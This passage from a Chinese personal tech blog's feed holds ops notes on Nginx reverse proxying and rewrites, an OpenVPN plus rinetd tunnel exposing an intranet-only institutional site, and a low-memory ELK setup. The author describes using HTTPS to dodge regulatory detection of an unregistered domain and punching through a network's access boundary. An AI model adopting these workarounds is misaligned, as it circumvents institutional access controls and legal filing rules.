class="comment">#proxy_pass http://bkjw.guet.edu.cn;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这样的配置看似是没有问题，但是在测试的时候，会发现非常非常多的 <code>404</code>。具体什么情况呢？因为页面的请求是相对与我们的路由路径 <code>/bkjw/</code> 来加载静态文件的。所以请求的路径是 <code>abc.com/bkjw/</code> 直接导致了静态文件的 <strong>404</strong>。</p><p>那么就想嘛，我把静态文件单独代就行了？所以有这样的：</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">location</span> <span class="regexp">~ .*\.(gif|jpg|jpeg|png|bmp|swf|js|css|html)$</span></span><br><span class="line"><span class="regexp"></span>&#123;</span><br><span class="line"><span class="attribute">proxy_pass</span> http://172.*.13.*;</span><br><span class="line">    <span class="attribute">expires</span>      <span class="number">30d</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>显然这样也是不行的，有悖了初衷，还是占用了 <code>/</code>。</p><h3 id="Set-Cookie-和-referer-的脑洞"><a href="#Set-Cookie-和-referer-的脑洞" class="headerlink" title="Set-Cookie 和 referer 的脑洞"></a>Set-Cookie 和 referer 的脑洞</h3><p>那么归根结底，我们要确认的是这个静态文件的请求是从哪里来的。于是就想到了 referer。</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">location</span> / &#123;</span><br><span class="line"><span class="attribute">if</span> (<span class="variable">$http_referer</span> <span class="regexp">~* '.*/bkjw/'</span> )&#123;</span><br><span class="line">    <span class="attribute">proxy_pass</span> http://172.#.13.#;</span><br><span class="line">   &#125;</span><br><span class="line">    <span class="attribute">return</span> <span class="number">403</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这样一试，还可以！打开了首页里面所有的东西都加载出来了。不过问题又出现了，在打开第二个页面的时候，<code>referer</code> 已经发生了变化，同样导致大量 404。</p><hr><p>这样，我就给用户一个标识，在请求资源的时候我就可以判断啦。这里就出现了 <code>set-cookie</code> 的方法。希望通过cookie的方式给用户一个标识符，说明其源站从哪里来。配置如下：</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">location</span> /bkjw/ &#123;</span><br><span class="line">    <span class="comment">#add_header Set-Cookie 'bussid=bkjw' ;</span></span><br><span class="line">    <span class="attribute">proxy_pass</span> http://172.16.13.22/;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="attribute">location</span> / &#123;</span><br><span class="line">if ($cookie_&#123;bussid&#125; ~* 'bkjw' )&#123;</span><br><span class="line">    <span class="attribute">proxy_pass</span> http://172.#.13.#;</span><br><span class="line">   &#125;</span><br><span class="line">    <span class="attribute">return</span> <span class="number">403</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>结果发现，并没有什么用。F12 看了看，发现了奥秘，<strong>请求静态资源的时候是不进行Cookie传递的</strong>，一想也是，这样才安全嘛。</p><blockquote><p>这里回顾一个经典的 phishing 的手段，在邮件中插入一个外部图片，透过请求图片的请求头，获得已读回执，和基本的系统状态 </p></blockquote><hr><p>至此没有办法，只能使用 <code>server_name</code> 来对其进行区分，最终的配置如上上的示例所示。显得不是那么有美感了。</p><h2 id="后面的话"><a href="#后面的话" class="headerlink" title="后面的话"></a>后面的话</h2><blockquote><p>人工智能的发展一旦上路了将会是飞速的，不要想着如何对付和人一样聪明的电脑，要么它永远不如你，要么它就把你远远的甩在身后。和你齐头并进只不过是一个瞬间而已。</p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前&quot;&gt;&lt;a href=&quot;#前&quot; class=&quot;headerlink&quot; title=&quot;前&quot;&gt;&lt;/a&gt;前&lt;/h2&gt;&lt;p&gt;很快这就是第二篇了，上篇信誓旦旦说的更好的方案，实际上，这里较比而已只是有了一点点改进XD&lt;/p&gt;
&lt;p&gt;上一篇：&lt;a href=&quot;https://
      
    
    </summary>
    
      <category term="OP之路" scheme="https://blog.diglp.xyz/categories/OP%E4%B9%8B%E8%B7%AF/"/>
    
    
      <category term="Nginx" scheme="https://blog.diglp.xyz/tags/Nginx/"/>
    
      <category term="Frp" scheme="https://blog.diglp.xyz/tags/Frp/"/>
    
  </entry>
  
  <entry>
    <title>记一次内网穿透配置(tunnel)</title>
    <link href="https://blog.diglp.xyz/2019/02/20/OP_%E6%84%9A%E8%A0%A2%E7%9A%84%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F%E6%96%B9%E6%A1%88(tunnel)/"/>
    <id>https://blog.diglp.xyz/2019/02/20/OP_愚蠢的内网穿透方案(tunnel)/</id>
    <published>2019-02-19T16:00:00.000Z</published>
    <updated>2019-03-04T11:57:26.000Z</updated>
    
    <content type="html"><![CDATA[<p>一个挺重要的网站,奈何只能内网访问, 想着把他外网映射出来…遂为之</p><hr><p>这篇文章应该是 2018/1/14时候就已经完成了，总是缺一点内容于是就没有post 出去。现在是时候了，因为完成同样的事情，现在有了第二个更好的解决方案，所以这这里 post 上去，做个对比。</p><p>这篇的方法十分的简单粗暴，使用了昂贵的资源，做了简单的事情，也是个反面教材。不过从底层的原理还是OK的。</p><h2 id="原理分析"><a href="#原理分析" class="headerlink" title="原理分析"></a>原理分析</h2><h3 id="VPN-simple概念"><a href="#VPN-simple概念" class="headerlink" title="VPN simple概念"></a>VPN simple概念</h3><p>VPN 是 Virtual Private Network 的缩写, 翻译过来是虚拟专用网络.引用百科的话来讲:</p><blockquote><p>虚拟专用网络的功能是：在公用网络上建立专用网络，进行加密通讯。在企业网络中有广泛应用。VPN网关通过对数据包的加密和数据包目标地址的转换实现远程访问。</p></blockquote><p><img src="https://timgsa.baidu.com/timg?image&amp;quality=80&amp;size=b9999_10000&amp;sec=1518414600419&amp;di=f908309c6976739a03741121bb706d0b&amp;imgtype=0&amp;src=http%3A%2F%2Fs9.rr.itc.cn%2Fr%2FwapChange%2F20171_23_14%2Fa7zdid2847716173619.jpg" alt="VPN"></p><p>通俗的讲, 使用VPN 技术,可以将 在公有网络的 两台主机, 进行一个私有的隧道链接, 效果,就和我们自家用的路由器一样. 在一个 VPN 下的子网主机是可以互相访问的(规则允许的话)</p><p>VPN 再协议栈层级很低的地方，一般在 2或者3 层，也就是数据链路层或者网络层，这里的 端口转发涉及到端端在第四层。</p><h3 id="端口转发-Port-Tunnel-simple概念"><a href="#端口转发-Port-Tunnel-simple概念" class="headerlink" title="端口转发(Port-Tunnel) simple概念"></a>端口转发(Port-Tunnel) simple概念</h3><p>一样援引百科的定义</p><blockquote><p>端口转发（Port forwarding），有时被叫做隧道(tunnel)，端口转发是转发一个网络端口从一个网络节点到另一个网络节点的行为，其使一个外部用户从外部经过一个被激活的NAT路由器到达一个在私有内部IP地址（局域网内部）上的一个端口。</p></blockquote><p>很好理解的东西, 端口转发技术, 显然是用于端到端的通信. 端到端,在TCP/IP的协议栈中, 是包含了TCP和UDP 这两种数据传输方式, 所以可见所有的应用层的数据, 都可以使用端口转发(这也是 ss 和 http代理的区别).</p><p>在这里我们使用端口转发, 对Http请求进行直接转发.<br><img src="http://img4.imgtn.bdimg.com/it/u=745504115,462270053&amp;fm=27&amp;gp=0.jpg" alt="port"></p><h2 id="实施"><a href="#实施" class="headerlink" title="实施"></a>实施</h2><h3 id="方案"><a href="#方案" class="headerlink" title="方案"></a>方案</h3><p>先使用外网VPN服务器, 让内网主机接入其子网, 而后通过两次的端口转发(port-tunnel), 达到内网服务器<br>现在分析具体情况, 我们的内网外部不可访问, 内网主机可以互相访问, 我们的内网主机可以访问外网. 所以我们我要实现的是</p><ul><li>先使得我们的主机可以外网访问, 所以首先连接外网, 这里就选择了VPN.内网主机,和公网主机组合成一个子网</li><li>内外网主机可以互相访问之后, 使用端口转发, 暴露公网主机的端口, 转发到我们的VPN子网的某个端口.实现外网访问我们内网的转发主机</li><li>实现了转发主机的外网访问之后, 我们再在转发主机上, 进行二次转发. 让流量,从虚拟子网, 转发到内网可以访问的目标主机的80 . </li><li>至此, 方案完成</li></ul><p><img src="https://i.loli.net/2018/02/12/5a810b0b4888d.png" alt="ARCH"></p><h3 id="具体实施"><a href="#具体实施" class="headerlink" title="具体实施"></a>具体实施</h3><p>这里使用 <code>OpenVPN</code> 在这里建立了VPN连接，为了方便管理和配置，（因为只是自己用），所以这里推荐使用 <code>openvpn-as</code> 是一个管理前端。免费版允许两台主机同时连接，自己使用实际上也是已经够了的。配置的过程这里年久失修，脑子里也没有了，难度系数一颗星。</p><p>在搭建完成之后，开始使用客户端进行连接，记得开放主机的安全组端口配置。连接之后，使用 <code>ifconfig</code> 应该会有个 Vlan的 interface 。这里就是我们的 VPN 子网。</p><hr><p>有了子网之后，先互 ping 确保联通。之后使用这里的主角 <code>rinetd</code> 。是一个十分轻量级的端口转发工具。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0.0.0.0 2333 172.16.64.*** 80</span><br></pre></td></tr></table></figure><p>启动脚本：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo pkill rinetd</span><br><span class="line">sudo rinetd -c /etc/rinetd.conf</span><br></pre></td></tr></table></figure><p>这样就实现了，在 <strong>2333</strong> 端口到目的主机的 80端口的内容转发，最终转发的就是我们的 HTTP 的请求。</p><hr><p>同样的，在我们的云服务器上一样需要这样的配置，把用户们输入的请求，转发到我们的 VPN 的子网之中，到内网转发主机的模板端口，来再进行下一次转发。在公网主机上我们一样使用上面类似的配置。只不过，是从 公网 转发到 VPN 子网，反向操作。</p><hr><p>综上，基本的链路已经实现和打通。还会有一点我问题。这样直接访问的话，得到的结果是 <strong>无法连接</strong>。 为什么？</p><p>因为，在默认的路由出了问题。</p><p>路由是什么？怎么用？ 看篇文章：<span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3JlbnlpZm9yZXZlci9hcnRpY2xlL2RldGFpbHMvNzc4NTEwMTI=" title="https://blog.csdn.net/renyiforever/article/details/77851012">win7操作系统双网卡同时上内外网<i class="fa fa-external-link"></i></span></p><p>所以文oveli对路由进行指定：让这个 IP 走我们的 199.1 的网关。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo route add -host 172.16.64.236 gw 192.168.199.1</span><br></pre></td></tr></table></figure><p>至此，整个配置完成。（辣鸡方案）</p><h2 id="后面的话"><a href="#后面的话" class="headerlink" title="后面的话"></a>后面的话</h2><p>这篇文章，是一年前的烂尾了，现在才post出来，是为了后面的更好的方案做对比。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;一个挺重要的网站,奈何只能内网访问, 想着把他外网映射出来…遂为之&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;这篇文章应该是 2018/1/14时候就已经完成了，总是缺一点内容于是就没有post 出去。现在是时候了，因为完成同样的事情，现在有了第二个更好的解决方案，所以这这里 post 上去
      
    
    </summary>
    
      <category term="OP之路" scheme="https://blog.diglp.xyz/categories/OP%E4%B9%8B%E8%B7%AF/"/>
    
    
  </entry>
  
  <entry>
    <title>ELK 日志可视化平台 搭建</title>
    <link href="https://blog.diglp.xyz/2019/02/14/OP_ELK%20%E6%97%A5%E5%BF%97%E5%8F%AF%E8%A7%86%E5%8C%96%20%E6%90%AD%E5%BB%BA%E7%AC%94%E8%AE%B0/"/>
    <id>https://blog.diglp.xyz/2019/02/14/OP_ELK 日志可视化 搭建笔记/</id>
    <published>2019-02-13T16:00:00.000Z</published>
    <updated>2019-03-04T11:57:26.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="架构选型"><a href="#架构选型" class="headerlink" title="架构选型"></a>架构选型</h2><p>这里使用ELK 平台主要是实现了单主机的日至手机以及可视化，吞吐量比较小，所以直接进行单点部署。由以下几个组件组成：</p><ul><li>FileBeat</li><li>Elasticsearch</li><li>Kibana</li></ul><p>Filebeat 这里实现日志文件的手机以及格式化，并且通过管道直接存入ES</p><p>ES 作为主体，实现对索引条目进行保存</p><p>Kibana 实现了ELK系统的整体监控，通过 API与ES交互，实现数据可视化，以及设置。</p><ul><li>logstash</li></ul><p>logstash 作为一个对数据进行流处理的module，这里由于不需要对日志进行进一步处理，所以并没有使用此组件。<strong>关键是内存真的不够了，跑不起来了是真的Q</strong></p><h2 id="安装及部署"><a href="#安装及部署" class="headerlink" title="安装及部署"></a>安装及部署</h2><p>安装以及部署的过程实际上并不是十分复杂，在<span class="exturl" data-url="aHR0cHM6Ly93d3cuZWxhc3RpYy5jby8=" title="https://www.elastic.co/">ELK项目官网<i class="fa fa-external-link"></i></span>上实际上已经给出了相关的 <code>rpm包</code>，所以直接使用 rpm 进行安装即可：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">-rw-r--r-- 1 root root  12M Jan 29 19:31 filebeat-6.6.0-x86_64.rpm</span><br><span class="line">-rw-r--r-- 1 root root 177M Jan 29 19:34 kibana-6.6.0-x86_64.rpm</span><br><span class="line">-rw-r--r-- 1 root root 163M Jan 29 19:35 logstash-6.6.0.rpm</span><br><span class="line">rpm -ivh xxx.rpm</span><br></pre></td></tr></table></figure><hr><p>这里涉及到的一个 point 是<code>systemV init</code> 还是 <code>systemd</code> 下面给出一篇相关文章，(IBM Developer 还真是个好地方。)</p><blockquote><p> <span class="exturl" data-url="aHR0cHM6Ly93d3cuaWJtLmNvbS9kZXZlbG9wZXJ3b3Jrcy9jbi9saW51eC8xNDA3X2xpdW1pbmdfaW5pdDMvaW5kZXguaHRtbA==" title="https://www.ibm.com/developerworks/cn/linux/1407_liuming_init3/index.html">浅析 Linux 初始化 init 系统，第 3 部分<i class="fa fa-external-link"></i></span></p></blockquote><p>这里提到的是Linux里最重要的启动进程，作为<strong>第一个用户态进程</strong> 其PID为1 <code>ps 1</code> 可以看到进程的运行。他负责在内核启动之后，完成余下的引导过程，比如加载加载服务，启动Shell/图形化界面等等。在 CentOS 7 之后，使用 Systemd 风格取代了原来的 init的风格。（使得启动速度有的提升）</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ ps 1</span><br><span class="line">  PID TTY      STAT   TIME COMMAND</span><br><span class="line">    1 ?        Ss     2:50 /usr/lib/systemd/systemd --switched-root --system --deserialize 21</span><br></pre></td></tr></table></figure><p>可以看到，这里的 ps1 已经是 systemd 了。</p><p>所以这里又涉及到了，Ubuntu 和 CentOS 的一大差别，自己也是用了才发现，之前Ubuntu的服务启动与管理使用 <code>service</code> 命令，并且在 <code>/etc/inittab</code> 里面可以对初始化进行一系列的配置。在Cent里面写着一句话：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">```</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">---</span><br><span class="line"></span><br><span class="line">总之在目前的环境中，使用 `systemctl` 命令对服务进行控制。</span><br><span class="line"></span><br><span class="line">```shell</span><br><span class="line">➜  ~ systemctl status elasticsearch.service</span><br><span class="line">● elasticsearch.service - Elasticsearch</span><br><span class="line">   Loaded: loaded (/usr/lib/systemd/system/elasticsearch.service; disabled; vendor preset: disabled)</span><br><span class="line">   Active: active (running) since Tue 2019-02-05 02:39:39 CST; 1 weeks 1 days ago</span><br><span class="line">     Docs: http://www.elastic.co</span><br><span class="line"> Main PID: 27965 (java)</span><br><span class="line">   CGroup: /system.slice/elasticsearch.service</span><br><span class="line">           ├─27965 /bin/java -Xms256m -Xmx256m -XX:+UseConcMarkSweepGC -XX:CMSInitiatingOccupancyFraction=75 -XX:+UseCMSInitiatingOccupancyOnly -Des.networkaddress.cache.ttl=6...</span><br><span class="line">           └─28026 /usr/share/elasticsearch/modules/x-pack-ml/platform/linux-x86_64/bin/controller</span><br></pre></td></tr></table></figure><hr><p>之后修改各自的配置文件，使得其端口对应，一般就可以跑起来了。</p><p>为了安全起见，这里使用 Nginx 做了一个 Web 的认证，对路由进行一个转发。</p><h2 id="环境调整"><a href="#环境调整" class="headerlink" title="环境调整"></a>环境调整</h2><h3 id="ES的JVM-的堆大小调整-（heap）"><a href="#ES的JVM-的堆大小调整-（heap）" class="headerlink" title="ES的JVM 的堆大小调整 （heap）"></a>ES的JVM 的堆大小调整 （heap）</h3><p>启ES的时候，直接报错 <code>unable to alloca</code> ，一想应该是内存太小了导致的问题。查看配置文件 <code>/etc/elasticsearch/jvm.options</code> 并且进行参数调整</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">-Xms256m# 这里缺省为 1g</span><br><span class="line">-Xmx256m</span><br></pre></td></tr></table></figure><p>由于本机的RAM也只有 <strong>1G</strong> 还得跑其他的奇怪的东西，所以这里只能非常的乞丐设置。分出一点宝贵内存。</p><h3 id="虚拟内存-Swap-的设置"><a href="#虚拟内存-Swap-的设置" class="headerlink" title="虚拟内存 Swap 的设置"></a>虚拟内存 Swap 的设置</h3><p>由于VM的机能，所以1G的内存显然是不够用的。只能改变参数。使得<code>JVM</code>分配的内存只有 256M。且，启用虚拟内存，即swap。</p><p><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3RpYW5sZXNvZnR3YXJlL2FydGljbGUvZGV0YWlscy84NzQxODcz" title="https://blog.csdn.net/tianlesoftware/article/details/8741873">Linux SWAP 交换分区配置说明 - CSDN<i class="fa fa-external-link"></i></span></p><hr><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">dd if=/dev/zero of=/swap-file bs=1M count=1024# 新建白文件 1G</span><br><span class="line">mkswap /swap-file# 格式化</span><br><span class="line">swapon /swap-file# 启用swap</span><br></pre></td></tr></table></figure><p>为了使swap自动挂载使用 <code>/etc/fstab</code> 里面进行配置：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">UUID=653bbeb5-4abb-4295-b110-5847e073140dswapswapdefaults00</span><br><span class="line">/swap-file swap    swap    defaults00</span><br></pre></td></tr></table></figure><hr><p>顺便调整了 <code>swappiness</code> 使得机器更加积极的使用 虚拟内存</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ sysctl vm/swappiness=60</span><br></pre></td></tr></table></figure><h3 id="设置副本数-0"><a href="#设置副本数-0" class="headerlink" title="设置副本数 0"></a>设置副本数 0</h3><p>由于只是单点，且性能受限，这里发现的问题es的节点状态一直是 <code>yellow</code>。归根发现就是性能问题，所以这里进行配置，<strong>设置其分片副本为 0</strong>。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">curl -H "Content-Type: application/json" -XPUT 'http://localhost:9202/_settings' -d '</span><br><span class="line">&#123;</span><br><span class="line">    "index" : &#123;</span><br><span class="line">        "number_of_replicas" : 0</span><br><span class="line">    &#125;</span><br><span class="line">&#125;'</span><br></pre></td></tr></table></figure><h2 id="后面的话"><a href="#后面的话" class="headerlink" title="后面的话"></a>后面的话</h2><p><strong>Happy Valentine’s Day</strong></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;架构选型&quot;&gt;&lt;a href=&quot;#架构选型&quot; class=&quot;headerlink&quot; title=&quot;架构选型&quot;&gt;&lt;/a&gt;架构选型&lt;/h2&gt;&lt;p&gt;这里使用ELK 平台主要是实现了单主机的日至手机以及可视化，吞吐量比较小，所以直接进行单点部署。由以下几个组件组成：&lt;/p&gt;
      
    
    </summary>
    
      <category term="OP之路" scheme="https://blog.diglp.xyz/categories/OP%E4%B9%8B%E8%B7%AF/"/>
    
    
      <category term="ELK" scheme="https://blog.diglp.xyz/tags/ELK/"/>
    
  </entry>
  
  <entry>
    <title>Nginx 折腾笔记（SSL配置以及路由重写）</title>
    <link href="https://blog.diglp.xyz/2019/02/08/OP_Nginx%E6%8A%98%E8%85%BE%E7%AC%94%E8%AE%B0%EF%BC%88SSL%E9%85%8D%E7%BD%AE%E4%BB%A5%E5%8F%8A%E8%B7%AF%E7%94%B1%E9%87%8D%E5%86%99%EF%BC%89/"/>
    <id>https://blog.diglp.xyz/2019/02/08/OP_Nginx折腾笔记（SSL配置以及路由重写）/</id>
    <published>2019-02-07T16:00:00.000Z</published>
    <updated>2019-03-04T11:57:26.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前面的话"><a href="#前面的话" class="headerlink" title="前面的话"></a>前面的话</h2><p>需求分析，由于 搭好了日志平台，本想着把Blog迁移到主机上，最后想想，算了</p><p>这里的博客的域名，本来是通过 在解析配置里面使用了一个 <code>CNAME</code>到 <a href="quartz010.github.io">quartz010.github.io</a> 实现一次访问，这里对架构进行一次调整。原 <code>blog</code>的二级先解析到服务器，留下日志之后，进行一次隐式跳转，实现一次访问。不过，这样会受限于服务器的带宽。但是也算是接入了日志平台。所以这里需要使用 Nginx  实现重定向。</p><hr><p>其二，域名不备案，web一起来，就被工信部给 ban 了。可是备案太麻烦了，真的是懒。所以这里跑 HTTPS ，做一个短期的检测绕过。因为 HTTPS 其报文内容是加密的，所以流量只要不是很大，应该也不至于单独去做侧信道的分析。所以这里顺便给部署全站的  HTTPS 访问暂时的撑着。</p><h2 id="显式重定向-和-隐式重定向"><a href="#显式重定向-和-隐式重定向" class="headerlink" title="显式重定向 和 隐式重定向"></a>显式重定向 和 隐式重定向</h2><p>这里的一点调整在于 Github page 的命名</p><p>当repo 命名为 <code>quartz010.github.io</code> 可以直接通过 其进行访问，如果其他命名的话，需要进行 quartz010.github.io/xxx 进行访问，所以修改之后导致了其找不到静态文件。导致样式消失以及一大堆404 的问题。</p><p>这里给出 基本配置：</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">server</span> &#123;</span><br><span class="line"><span class="attribute">listen</span>       <span class="number">80</span>;</span><br><span class="line">    <span class="attribute">listen</span>       [::]:<span class="number">80</span>;</span><br><span class="line">   </span><br><span class="line">   <span class="attribute">server_name</span> blog1.diglp.xyz;</span><br><span class="line">   </span><br><span class="line">   <span class="comment"># Load configuration files for the default server block.</span></span><br><span class="line">   <span class="attribute">include</span> /etc/nginx/default.d/<span class="regexp">*.conf</span>;</span><br><span class="line">   </span><br><span class="line">   <span class="attribute">location</span> / &#123;</span><br><span class="line">   <span class="comment">#rewrite  ^/(.*)$  /$1 break;</span></span><br><span class="line">   <span class="attribute">proxy_pass</span> https://quartz010.github.io;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="comment"># rewrite "^/(.*)$" https://quartz010.github.io/$1 last;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里的重点在 Location 的这一段：</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">location</span> / &#123;</span><br><span class="line"><span class="comment">#1# rewrite  ^/(.*)$  /$1 break;# 隐式重定向</span></span><br><span class="line"><span class="comment">#2# proxy_pass https://quartz010.github.io;# 显式重定向</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里的重定向方式有两种，不过严格意义上讲，通过<code>proxy_pass</code>实现的只能叫做反向代理。不过这里用到了实现 Url不改变的重定向，也权且这样叫吧。 后面讲路由重写，这里先看这个正则表达式 <code>^/(.*)$</code> 代表以 <code>/</code> 开头中间匹配 <code>.*</code> (也就是任意个单字符)，之后再进行结尾。综上是匹配所有的路由。</p><h2 id="路由重写"><a href="#路由重写" class="headerlink" title="路由重写"></a>路由重写</h2><p>路由的重写，这里算得上是很重要的一个模块了。一般 Nginx 默认编译需要 加上 Pcre 的正则的库，其基本语法如下：</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">server</span> &#123;</span><br><span class="line">    <span class="attribute">rewrite</span> 规则 定向路径 重写类型;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>规则：用于匹配的 URL 或者是正则表达式。</li><li>重定向之后的链接，可以带参数</li><li><p>重写类型：</p><ul><li>last ：表示完成rewrite，浏览器地址栏URL地址不变</li><li>break：本条规则匹配完成后，终止匹配，不再匹配后面的规则，浏览器地址栏URL地址不变</li><li>redirect：返回302临时重定向，浏览器地址会显示跳转后的URL地址</li><li>permanent：返回301永久重定向，浏览器地址栏会显示跳转后的URL地址</li></ul></li><li><p><strong>作用域:</strong> <em>server, location, if</em></p></li></ul><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">rewrite</span><span class="regexp"> ^(.*)$</span>  https://<span class="variable">$host</span><span class="variable">$1</span> <span class="literal">permanent</span></span><br></pre></td></tr></table></figure><p>这里的重写类型是可选项，也可以不进行指定。这里值得注意的是，last 和 break 类型的区别。last 可以理解为，对url改变之后，继续对url进行重写匹配，知道最后没有相关规则时候便停止。break 在完成本次的重写之后，就不进行后继的匹配重写。eg</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">server</span> &#123;</span><br><span class="line">    <span class="attribute">location</span> / &#123;</span><br><span class="line">        <span class="attribute">rewrite</span> /<span class="number">111</span>/ /<span class="number">555</span>/ <span class="literal">last</span>;</span><br><span class="line">        <span class="attribute">rewrite</span> /<span class="number">222</span>/ /<span class="number">555</span>/ <span class="literal">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="attribute">location</span><span class="regexp"> ^~</span> /<span class="number">555</span>/ &#123;</span><br><span class="line">        internal;</span><br><span class="line">        empty_gif;</span><br><span class="line">        <span class="attribute">return</span> <span class="number">403</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在这样的配置下。得到的结果是 访问 <code>/111/</code> 的时候，直接返回了403的页面。而访问 <code>/222/</code> 的时候，得到了404的返回。不过，值得注意的是， <code>111</code> 返回了 403 的内容，但是实际上的 URL 并没有发生改变。即：</p><p><strong>xxx/111/ 的 URL 实际上是返回了 /555/ 的内容</strong>  </p><h2 id="SSL-配置"><a href="#SSL-配置" class="headerlink" title="SSL 配置"></a>SSL 配置</h2><h3 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h3><p>SSL 在http的具体应用就是 HTTPS （<strong>HTTP over TLS</strong>）。</p><blockquote><p>HTTPS的主要思想是在不安全的网络上创建一安全信道，并可在使用适当的加密包和<em>服务器证书可被验证且可被信任时</em>，对<span class="exturl" data-url="aHR0cHM6Ly96aC53aWtpcGVkaWEub3JnL3dpa2kvJUU3JUFCJThBJUU4JTgxJUJE" title="https://zh.wikipedia.org/wiki/%E7%AB%8A%E8%81%BD">窃听<i class="fa fa-external-link"></i></span>和<span class="exturl" data-url="aHR0cHM6Ly96aC53aWtpcGVkaWEub3JnL3dpa2kvJUU0JUI4JUFEJUU5JTk3JUI0JUU0JUJBJUJBJUU2JTk0JUJCJUU1JTg3JUJC" title="https://zh.wikipedia.org/wiki/%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB">中间人攻击<i class="fa fa-external-link"></i></span>提供合理的防护。</p></blockquote><p>一样回到PKI（Public Key Instruction）的体系里面，其中一个重要的概念就是 HTTPS 的证书。</p><p>在普通的点对点加密里面，另个客户端可以直接进行秘钥的商定。</p><p>但是在 BS 